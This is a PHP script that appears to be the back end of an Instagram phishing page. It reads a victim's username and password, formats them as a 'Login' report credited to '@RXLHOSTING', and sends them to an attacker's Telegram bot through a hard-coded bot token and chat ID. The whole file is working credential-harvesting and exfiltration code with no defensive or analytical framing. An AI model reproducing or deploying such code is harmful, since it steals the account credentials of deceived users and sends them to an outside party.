<?php
session_start();
$uname = "<code>".$_SESSION['uname']."</code>";
$pass = "<code>".$_POST['pass']."</code>";

$message = "
( Instagram | Login )
==========================
- Username : ".$uname."
- Password : ".$pass." 
==========================
Tele : @RXLHOSTING
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

$id_botTele = "6013753018:AAEWqmIp8DmwejWRqbC0MpL1QaN-zJdopCE";
$id_telegram = "2079666452";
sendMessage($id_telegram, $message, $id_botTele);
?>
